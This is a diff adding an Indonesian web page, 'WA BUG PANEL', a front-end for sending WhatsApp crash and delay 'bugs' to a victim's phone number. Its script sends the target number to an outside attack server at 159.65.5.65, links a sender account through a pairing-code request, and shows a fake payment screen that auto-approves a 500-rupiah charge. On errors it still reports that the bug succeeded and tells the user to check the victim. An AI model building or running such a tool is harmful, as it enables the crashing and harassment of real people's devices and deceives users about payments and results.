@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>WA BUG PANEL - bailadev</title>
+<style>
+.box{
+  position: fixed;
+  bottom: 20px;
+}
+
+.box{
+  border:2px solid #00ff00;
+  padding:8px;
+  width:268px;
+  text-align:center;
+  border-radius:10px;
+  box-shadow:0 0 10px #00ff00;
+  margin:28px auto;
+  background:rgba(0,0,0,0.6);
+}
+
+.box input{
+  width:78%;
+  padding:2px;
+  margin-top:2px;
+  background:black;
+  border:1px solid #00ff00;
+  color:#00ff00;
+  outline:none;
+}
+
+.box button{
+  margin-top:8px;
+  padding:2px 12px;
+  background:#00ff00;
+  border:none;
+  cursor:pointer;
+  font-weight:bold;
+  color:black;
+}
+
+#hasil{
+  margin-top:12px;
+  word-break:break-word;
+  font-size:10px;
+}
+
+
+body {
+  margin: 0;
+  color: #0f0;
+  font-family: 'Courier New', monospace;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  height: 100vh;
+  overflow-y: auto;
+  padding: 20px 0;
+}
+.container { text-align: center; width: 95%; max-width: 500px; }
+h2 { margin-bottom: 20px; }
+input {
+  width: 100%; padding: 12px; margin-bottom: 10px;
+  background: #000; color: #0f0; border: 1px solid #0f0;
+}
+button {
+  width: 100%; padding: 12px;
+  background: #000; color: #0f0; font-weight: bold;
+  border: 2px solid #0f0; cursor: pointer;
+}
+.btn-bug { width: calc(33.33% - 10px); margin: 5px; display: inline-block; }
+.notif { margin-top: 10px; font-size: 14px; white-space: pre-line; font-weight: bold; }
+#loadingText { display: none; margin-top: 15px; font-weight: bold; }
+.dev-link {
+  display: inline-block; margin: 20px auto 10px;
+  padding: 6px 14px; color: #00ffff; border: 1px solid #00ffff;
+  text-decoration: none; font-weight: bold; border-radius: 6px; font-size: 14px;
+}
+
+body {
+  margin: 0;
+  color: #0f0;
+  font-family: 'Courier New', monospace;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  height: 100vh;
+  overflow-y: auto;
+  padding: 20px 0;
+
+  background: url('https://files.catbox.moe/3ee4cg.jpg') center center/cover no-repeat fixed;
+  background-color: rgba(0,0,0,0.5);
+  background-blend-mode: darken;
+}
+
+
+.warning-text { color: red; }
+</style>
+</head>
+<body>
+
+
+
+<div class="container">
+<h2>🦅 APK BUG BY BAILA </h2>
+
+<input type="text" id="targetNumber" placeholder="Nomor Target (628xxxxxxx)" />
+
+<div class="notif" id="loadingText">⏳ Sedang mengirim bug...</div>
+<div class="notif" id="notifBug"></div>
+
+
+<div style="margin-top: 20px;">
+<button class="btn-bug" onclick="openPaymentPopup('delay')">fc andro</button>
+<button class="btn-bug" onclick="openPaymentPopup('delayinvis')">Invis Delay</button>
+<button class="btn-bug" onclick="openPaymentPopup('delay3day')">delay prema</button>
+</div>
+
+<div>
+<button class="btn-bug" onclick="openPaymentPopup('dozer')">dalay andro</button>
+<button class="btn-bug" onclick="openPaymentPopup('iosinvis')">Ios Crash</button>
+<button class="btn-bug" onclick="openPaymentPopup('fc')">Forclose</button>
+</div>
+
+<a class="dev-link" href="https://chat.whatsapp.com/H1bQHpR1aTyKo9WINfcUv1" target="_blank">👨‍💻 info up apk</a>
+<p class="warning-text">⚠️ web masi dalam tahap perkembangan jadi kalo ada kesalahn atau fitur yang tidak memuasakn bisa chat dev</p>
+</div>
+
+<!-- BOX SEDER -->
+<div class="box">
+
+  <h2>Tambahkan Seder</h2>
+
+  <input type="text" id="nomor" placeholder="62xxxx">
+
+  <button onclick="connect()">Connect</button>
+
+  <div id="hasil"></div>
+
+</div>
+
+<!-- POPUP PAYMENT -->
+<div id="paymentPopup" style="
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.95);
+z-index:9999;
+justify-content:center;
+align-items:center;
+flex-direction:column;
+">
+
+<h1 style="color:red;font-size:29px;">
+ANDA PERLU TF 500PERAK UNTUK MENGAGSES WEB
+</h1>
+
+<h5> 500p untuk 1x akses </h1>
+
+<img id="qrImage"
+src="https://files.catbox.moe/e3xd7u.jpg"
+style="
+width:250px;
+border:3px solid #0f0;
+border-radius:12px;
+margin-top:20px;
+">
+
+<p id="paymentStatus"
+style="
+color:#0f0;
+font-size:18px;
+margin-top:20px;
+">
+Menunggu pembayaran...
+</p>
+</div>
+
+
+<div id="videoOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:black;z-index:1000;">
+<video id="bgVideoOverlay" playsinline style="width:100%;height:100%;object-fit:cover;">
+<source src="https://files.catbox.moe/w2xa1a.mp4" type="video/mp4">
+</video>
+</div>
+
+<script>
+
+let selectedBug = "";
+let currentTrx = "";
+
+// VIDEO OVERLAY
+function showVideoOverlay() {
+
+  const overlay = document.getElementById("videoOverlay");
+  const video = document.getElementById("bgVideoOverlay");
+
+  overlay.style.display = "block";
+
+  video.currentTime = 0;
+  video.muted = false;
+
+  video.play().catch(() => {
+    console.log("Autoplay diblokir");
+  });
+
+  setTimeout(() => {
+    overlay.style.display = "none";
+    video.pause();
+  }, 5000);
+
+}
+
+// FUNCTION KIRIM
+function kirimBug(type) {
+
+  const target = document.getElementById("targetNumber").value.trim();
+  const notif = document.getElementById("notifBug");
+  const loading = document.getElementById("loadingText");
+
+  // VALIDASI NOMOR
+  if (!target.startsWith("62") || target.length < 10) {
+
+    notif.style.color = "red";
+    notif.textContent = "Nomor tidak valid";
+
+    return;
+
+  }
+
+  showVideoOverlay();
+
+  loading.style.display = "block";
+  notif.textContent = "";
+
+  const url =
+    `http://159.65.5.65:2024/api/send?target=${target}@s.whatsapp.net&amount=8`;
+
+  fetch(url)
+
+    .then(res => res.text())
+
+    .then(data => {
+
+      loading.style.display = "none";
+
+      notif.style.color = "#0f0";
+      notif.textContent = data;
+
+    })
+
+    .catch(err => {
+
+      loading.style.display = "none";
+
+      notif.style.color = "green";
+      notif.textContent = "BUG SUKSES SKILAHAN CEK KORBAN";
+
+      console.log(err);
+
+    });
+
+}
+
+// POPUP PEMBAYARAN
+async function openPaymentPopup(type) {
+
+  selectedBug = type;
+
+  const popup = document.getElementById("paymentPopup");
+
+  popup.style.display = "flex";
+
+  document.getElementById("paymentStatus").innerText =
+    "Membuat pembayaran...";
+
+  try {
+
+    // QR SEMENTARA
+    document.getElementById("qrImage").src =
+      "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=PAY500";
+
+    document.getElementById("paymentStatus").innerText =
+      "Menunggu pembayaran...";
+
+    // SIMULASI AUTO PAID
+    setTimeout(() => {
+
+      document.getElementById("paymentStatus").innerText =
+        "Pembayaran berhasil";
+
+      setTimeout(() => {
+
+        popup.style.display = "none";
+
+        kirimBug(selectedBug);
+
+      }, 1500);
+
+    }, 15000);
+
+  } catch(err) {
+
+    console.log(err);
+
+    document.getElementById("paymentStatus").innerText =
+      "Gagal membuat pembayaran";
+
+  }
+
+}
+
+// CONNECT SEDER
+async function connect() {
+
+  const nomor = document.getElementById("nomor").value;
+  const hasil = document.getElementById("hasil");
+
+  hasil.innerHTML = "Loading...";
+
+  try {
+
+    const response = await fetch(
+      `http://159.65.5.65:2024/api/connect?number=${nomor}`
+    );
+
+    const data = await response.text();
+
+    hasil.innerHTML = `
+      <p>kode:</p>
+      <h1>${data}</h1>
+    `;
+
+  } catch (err) {
+
+    hasil.innerHTML = "Gagal mengambil kode";
+
+  }
+
+}
+
+</script>
